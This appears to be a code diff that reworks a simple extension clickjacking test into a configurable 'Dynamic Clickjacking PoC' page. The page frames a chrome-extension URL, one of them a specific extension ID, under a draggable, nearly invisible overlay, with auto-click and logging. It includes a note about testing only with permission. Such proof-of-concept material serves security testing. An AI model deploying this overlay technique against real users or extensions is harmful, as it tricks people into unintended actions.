@@ -1,64 +1,118 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Ext iframe clickjack test</title>
+<meta charset="utf-8" />
+<title>Dynamic Clickjacking PoC</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
 <style>
-  body { font-family: Arial, sans-serif; padding: 12px; }
-  #frameWrap { width: 1000px; height: 600px; border: 2px solid #ccc; position: relative; background:#eee; }
-  iframe { width:100%; height:100%; border:0; }
-  /* transparent overlay (simulate attacker) */
-  #overlay {
-    position:absolute;
-    left:50px; top:50px;
-    width:300px; height:80px;
-    opacity:0.0001; z-index:999;
-    cursor: pointer;
-  }
-  #log { white-space: pre-wrap; margin-top:12px; background:#fafafa; padding:8px; border:1px solid #ddd; height:140px; overflow:auto;}
+  body{font-family:Arial,Helvetica,sans-serif;padding:12px}
+  #frameWrap{width:360px;height:640px;border:2px solid #777;position:relative;background:#f3f3f3}
+  iframe{width:100%;height:100%;border:0;display:block}
+  #overlay{position:absolute;left:50px;top:120px;width:220px;height:40px;z-index:999;opacity:0.02;cursor:pointer}
+  #controls{margin-bottom:12px}
+  #log{white-space:pre-wrap;background:#fff;padding:8px;border:1px solid #ddd;height:160px;overflow:auto;margin-top:12px}
+  input[type=text]{width:80%}
+  button{margin-left:6px}
 </style>
 </head>
 <body>
-  <h3>Testing chrome-extension load + overlay click (use HTTP, not file://)</h3>
+  <h3>Dynamic Clickjacking PoC</h3>
+  <div id="controls">
+    <label>extensionUrl (query param supported):</label><br/>
+    <input id="extUrl" type="text" placeholder="chrome-extension://<EXT_ID>/path/to/page.html">
+    <button id="loadBtn">Load iframe</button>
+    <button id="toggleOv">Toggle Overlay</button>
+    <button id="autoClick">Start Auto-click</button>
+    <button id="clearLog">Clear log</button>
+  </div>
+
   <div id="frameWrap">
-    <iframe id="ext"
-      src="chrome-extension://fiikommddbeccaoicoejoniammnalkfa/src/pages/SidePanel/index.html"
-      sandbox="allow-scripts allow-forms">
-    </iframe>
-    <button id="overlay">transparent overlay (simulate click)</button>
+    <iframe id="extFrame" src="" sandbox=""></iframe>
+    <div id="overlay" title="transparent overlay"></div>
   </div>
 
   <div id="log"></div>
 
-  <script>
-    const logEl = document.getElementById('log');
-    const log = (s) => { logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; };
+<script>
+const logEl = document.getElementById('log');
+const log = (s)=>{logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight;}
+const extFrame = document.getElementById('extFrame');
+const overlay = document.getElementById('overlay');
+const extInput = document.getElementById('extUrl');
 
-    const iframe = document.getElementById('ext');
-    iframe.addEventListener('load', () => {
-      log('iframe load EVENT fired — resource probably reachable (200).');
-    });
+function paramExtUrl(){
+  try{
+    const p = new URL(location.href).searchParams.get('extensionUrl');
+    return p && p.trim();
+  }catch(e){ return null; }
+}
 
-    // Try to detect if iframe rendered visible content by checking its size + paint timing
-    setTimeout(() => {
-      try {
-        // reading contentWindow.location will likely throw (cross-origin)
-        log('attempt iframe.href -> ' + iframe.contentWindow.location.href);
-      } catch (e) {
-        log('cannot read iframe.contentWindow (expected cross-origin): ' + e.message);
-      }
-    }, 800);
+// Pre-fill from query param if present
+const pre = paramExtUrl();
+if(pre){ extInput.value = pre; log("Loaded extensionUrl from query param."); }
 
-    // overlay simulates attacker clickable area over the iframe
-    document.getElementById('overlay').addEventListener('click', () => {
-      log('Overlay clicked — if this triggers a sensitive action in the extension UI, clickjacking possible.');
-    });
+// Load button
+document.getElementById('loadBtn').addEventListener('click', ()=>{
+  const u = extInput.value.trim();
+  if(!u) return alert('Set extension URL first');
+  extFrame.src = u;
+  log('Loading iframe: ' + u);
+});
 
-    // optional: automatically click overlay after 2s to simulate silent click
-    setTimeout(() => {
-      log('Auto-click overlay to simulate attack (non-user gesture).');
-      document.getElementById('overlay').click();
-    }, 2000);
-  </script>
+// iframe load detection
+extFrame.addEventListener('load', ()=>{
+  log('iframe load EVENT fired — resource reachable (status likely 200).');
+  // cannot access DOM due to cross-origin, so we stop here
+});
+
+// overlay click => record
+overlay.addEventListener('click', (e)=>{
+  log('Overlay clicked at client(' + e.clientX + ',' + e.clientY + '). If extension UI underlay reacts, clickjacking possible.');
+  // we intentionally do NOT attempt to synthesize privileged gestures inside the frame
+});
+
+// toggle overlay
+document.getElementById('toggleOv').addEventListener('click', ()=>{
+  if(overlay.style.display === 'none' || overlay.style.opacity === '0'){
+    overlay.style.opacity = '0.02';
+    overlay.style.display = 'block';
+    log('Overlay visible (semi-transparent). Position it above target button.');
+  } else {
+    overlay.style.opacity = '0';
+    overlay.style.display = 'block';
+    log('Overlay set to transparent (very stealthy).');
+  }
+});
+
+// auto click
+let ai = null;
+document.getElementById('autoClick').addEventListener('click', ()=>{
+  if(ai){ clearInterval(ai); ai=null; log('Auto-click stopped'); return; }
+  ai = setInterval(()=>{ overlay.click(); log('Auto-click fired (overlay.click())'); }, 1000);
+  log('Auto-click started (1s interval).');
+});
+
+// clear log
+document.getElementById('clearLog').addEventListener('click', ()=> logEl.textContent = '');
+
+// helper: let user drag overlay to position (simple)
+let dragging=false, ofsX=0, ofsY=0;
+overlay.style.left='50px'; overlay.style.top='120px';
+overlay.addEventListener('mousedown', (e)=>{ dragging=true; ofsX = e.offsetX; ofsY = e.offsetY; });
+document.addEventListener('mouseup', ()=> dragging=false);
+document.addEventListener('mousemove', (e)=>{ if(!dragging) return; 
+  const rect = document.getElementById('frameWrap').getBoundingClientRect();
+  let x = e.clientX - rect.left - ofsX; let y = e.clientY - rect.top - ofsY;
+  if(x<0) x=0; if(y<0) y=0; overlay.style.left = x+'px'; overlay.style.top = y+'px';
+});
+
+// initial instructions
+log('Instructions:');
+log('1) Paste extension URL (chrome-extension://<EXT_ID>/path) or use ?extensionUrl=... parameter and click Load.');
+log('2) If iframe displays UI, move overlay above target button (drag) and click overlay.');
+log('3) Monitor extension UI or background console for reactions.');
+log('');
+log('Ethics: Use only on your own test extension or with permission. Do NOT publish live exploit PoC without consent.');
+</script>
 </body>
 </html>
